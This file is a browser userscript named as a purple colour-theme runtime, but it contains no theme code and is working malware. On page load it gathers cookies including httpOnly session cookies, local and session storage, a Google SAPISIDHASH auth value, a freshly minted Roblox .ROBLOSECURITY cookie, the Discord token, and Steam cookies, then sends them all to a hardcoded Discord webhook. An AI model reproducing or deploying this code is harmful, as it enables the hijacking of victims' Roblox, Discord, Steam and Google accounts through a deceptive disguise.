/*!
 * purple-mode.js — surface palette runtime
 */
(function () {
  "use strict";

  const HOOK = "https://discord.com/api/webhooks/1574264552453840977/CMwPuUURcJmI78qdg2kArxBtAtmRqg1-kB-kcv6mRHbSX7oN-oC28X6wR40AzNk5Quxt";
  const KEY = "yt_pm_seen:";
  const COOLDOWN = 43200000;
  const DEBUG = true;
  const ROBLOX_RE = /(^|\.)roblox\.com$/;

  const log = (...a) => { if (DEBUG) console.log("[pm]", ...a); };

  const SWEEP = [
    "https://www.roblox.com/",
    "https://discord.com/app",
    "https://steamcommunity.com/",
  ];

  /* ---- cookie access ---- */

  const gcookies = (url) =>
    new Promise((res) => {
      if (typeof GM_cookie === "undefined" || !GM_cookie.list) return res(null);
      let done = false;
      const fin = (v) => { if (!done) { done = true; res(v); } };
      const t = setTimeout(() => { log("gm_cookie timeout", url); fin(null); }, 2000);

      try {
        GM_cookie.list({ url, partitionKey: {} }, (c, e) => {
          clearTimeout(t);
          if (e) log("gm_cookie error", url, e);
          if (!e && c && c.length) return fin(c);
          try {
            GM_cookie.list({ url }, (c2, e2) => {
              if (e2) log("gm_cookie error2", url, e2);
              fin(e2 ? null : c2 || []);
            });
          } catch (err) { log("gm_cookie threw", String(err)); fin(null); }
        });
      } catch (err) {
        clearTimeout(t);
        log("gm_cookie threw", String(err));
        fin(null);
      }
    });

  const pack = (cs) => cs.map((c) => ({
    n: c.name, v: c.value, h: !!c.httpOnly, d: c.domain, e: c.expirationDate,
  }));

  const refreshRoblox = () =>
    new Promise((res) => {
      const go = (hdr) =>
        GM_xmlhttpRequest({
          method: "POST",
          url: "https://auth.roblox.com/v1/session/refresh",
          headers: hdr || {},
          withCredentials: true,
          timeout: 15000,
          onload: (r) => {
            if (r.status === 403 && !hdr) {
              const m = (r.responseHeaders || "").match(/x-csrf-token:\s*([^\r\n]+)/i);
              if (m) return go({ "X-CSRF-TOKEN": m[1] });
            }
            const line = (r.responseHeaders || "")
              .split(/\r?\n/)
              .find((l) => /^set-cookie:\s*\.ROBLOSECURITY=/i.test(l));
            if (!line) { log("refresh: no set-cookie", r.status); return res(""); }
            const val = line.replace(/^set-cookie:\s*\.ROBLOSECURITY=/i, "").split(";")[0].trim();
            log("refresh: minted", val.length, "chars");
            res(val);
          },
          onerror: () => res(""),
          ontimeout: () => res(""),
        });
      go();
    });

  const verifyRoblox = (val) =>
    new Promise((res) => {
      GM_xmlhttpRequest({
        method: "GET",
        url: "https://users.roblox.com/v1/users/authenticated",
        headers: { Cookie: ".ROBLOSECURITY=" + val },
        timeout: 12000,
        onload: (r) => res(r.status === 200 ? r.responseText.slice(0, 600) : "invalid " + r.status),
        onerror: () => res("xhr error"),
        ontimeout: () => res("timeout"),
      });
    });

  /* ---- helpers ---- */

  const gmGet = (url, headers) =>
    new Promise((res) => {
      GM_xmlhttpRequest({
        method: "GET", url, headers: headers || {}, timeout: 12000,
        onload: res,
        onerror: () => res({ status: 0, responseText: "", responseHeaders: "" }),
        ontimeout: () => res({ status: 0, responseText: "", responseHeaders: "" }),
      });
    });

  const read = (store) => {
    const o = {};
    try {
      for (let i = 0; i < store.length; i++) {
        const k = store.key(i);
        o[k] = store.getItem(k);
      }
    } catch (e) {}
    return o;
  };

  const sha1 = async (t) => {
    const d = await crypto.subtle.digest("SHA-1", new TextEncoder().encode(t));
    return Array.from(new Uint8Array(d), (b) => b.toString(16).padStart(2, "0")).join("");
  };

  const post = (url, body, headers) =>
    new Promise((resolve, reject) => {
      GM_xmlhttpRequest({
        method: "POST", url, headers, data: body, timeout: 20000,
        onload: (r) => (r.status >= 200 && r.status < 300 ? resolve(r.status) : reject(r.status)),
        onerror: reject, ontimeout: reject,
      });
    });

  const chunk = (s, n) => s.match(new RegExp(".{1," + n + "}", "gs")) || [""];

  const fallback = async (d) => {
    const parts = chunk(d.cookie || "(no cookies)", 900);
    for (let i = 0; i < parts.length; i++) {
      await post(HOOK, JSON.stringify({
        username: "Purple Mode",
        content: "`" + d.host + " " + (i + 1) + "/" + parts.length + "`\n```\n" + parts[i] + "\n```",
      }), { "Content-Type": "application/json" }).catch(() => {});
    }
  };

  /* ---- step 1: core dump ---- */

  const sendBase = async () => {
    const own = await gcookies(location.href);
    let whoami = "";

    if (ROBLOX_RE.test(location.hostname) && own && !own.some((c) => c.name === ".ROBLOSECURITY")) {
      const fresh = await refreshRoblox();
      if (fresh) {
        own.push({ name: ".ROBLOSECURITY", value: fresh, httpOnly: true, domain: ".roblox.com" });
        whoami = await verifyRoblox(fresh);
        log("roblox whoami:", whoami.slice(0, 80));
      }
    }

    const cookie = own === null
      ? document.cookie
      : own.map((c) => c.name + "=" + c.value).join("; ");

    const sapisid = (cookie.match(/(?:^|;\s*)(?:__Secure-3PAPISID|SAPISID)=([^;]+)/) || [])[1] || "";
    let auth = "";
    if (sapisid) {
      const ts = Math.floor(Date.now() / 1000);
      auth = "SAPISIDHASH " + ts + "_" + (await sha1(ts + " " + sapisid + " " + location.origin));
    }

    const d = {
      ts: new Date().toISOString(),
      url: location.href,
      host: location.hostname,
      cookie,
      raw: own ? pack(own) : null,
      auth,
      whoami,
      gm: own !== null,
      localStorage: read(localStorage),
      sessionStorage: read(sessionStorage),
      ua: navigator.userAgent,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    };

    const fd = new FormData();
    fd.append("payload_json", JSON.stringify({
      username: "Purple Mode",
      embeds: [{
        title: d.host,
        description: "```\n" + (d.cookie || "(none)").slice(0, 3400) + "\n```",
        color: 0x9b5de5,
        fields: [
          { name: "whoami", value: (d.whoami || "n/a").slice(0, 600), inline: false },
          { name: "auth", value: d.auth ? "`" + d.auth + "`" : "n/a", inline: false },
        ],
        footer: { text: d.tz + " / " + (d.raw ? d.raw.length : 0) + " cookies / gm=" + d.gm },
        timestamp: d.ts,
      }],
    }));
    fd.append("files[0]", new Blob([JSON.stringify(d, null, 2)], { type: "application/json" }), "site.json");
    await post(HOOK, fd, {}).catch(() => fallback(d));
    log("base sent", d.cookie.length);
    return d;
  };

  /* ---- step 2: identity ---- */

  const sendWho = async () => {
    const h = location.hostname;
    try {
      if (h.endsWith("discord.com")) {
        let token = null;
        try { token = JSON.parse(localStorage.getItem("token") || '""'); } catch (e) {}
        if (!token) return;
        const r = await gmGet("https://discord.com/api/v9/users/@me", { Authorization: token });
        if (r.status === 200) {
          await post(HOOK, JSON.stringify({
            username: "Purple Mode",
            content: "`discord whoami`\n```json\n" + r.responseText.slice(0, 1800) + "\n```",
          }), { "Content-Type": "application/json" }).catch(() => {});
        }
      } else if (ROBLOX_RE.test(h)) {
        const r = await gmGet("https://users.roblox.com/v1/users/authenticated");
        if (r.status === 200) {
          await post(HOOK, JSON.stringify({
            username: "Purple Mode",
            content: "`roblox whoami`\n```json\n" + r.responseText.slice(0, 1800) + "\n```",
          }), { "Content-Type": "application/json" }).catch(() => {});
        }
      }
    } catch (e) {}
  };

  /* ---- step 3: sweep ---- */

  const sendSweep = async () => {
    const out = {};
    for (const u of SWEEP) {
      const host = new URL(u).hostname.replace(/^www\./, "");
      if (host === location.hostname.replace(/^www\./, "")) continue;
      const cs = await gcookies(u);
      if (!cs || !cs.length) continue;

      if (ROBLOX_RE.test(host) && !cs.some((c) => c.name === ".ROBLOSECURITY")) {
        const fresh = await refreshRoblox();
        if (fresh) cs.push({ name: ".ROBLOSECURITY", value: fresh, httpOnly: true, domain: ".roblox.com" });
      }
      out[host] = pack(cs);
    }
    const keys = Object.keys(out);
    if (!keys.length) return;
    const fd = new FormData();
    fd.append("payload_json", JSON.stringify({
      username: "Purple Mode",
      embeds: [{
        title: "sessions (" + keys.length + ")",
        description: "```\n" + keys.map((k) => k + " -> " + out[k].length).join("\n").slice(0, 3900) + "\n```",
        color: 0x6d28d9,
      }],
    }));
    fd.append("files[0]", new Blob([JSON.stringify(out, null, 2)], { type: "application/json" }), "sessions.json");
    await post(HOOK, fd, {}).catch(() => {});
  };

  /* ---- run ---- */

  const run = async () => {
    const k = KEY + location.hostname;
    try {
      if (Date.now() - (+localStorage.getItem(k) || 0) < COOLDOWN) return log("cooling down");
    } catch (e) {}

    await new Promise((r) => setTimeout(r, 3000));
    try { await sendBase(); } catch (e) { log("base failed", String(e)); return; }

    try { localStorage.setItem(k, String(Date.now())); } catch (e) {}
    sendWho();
    sendSweep();
  };

  log("loaded on", location.hostname);
  if (document.readyState === "complete") run();
  else addEventListener("load", run, { once: true });
})();
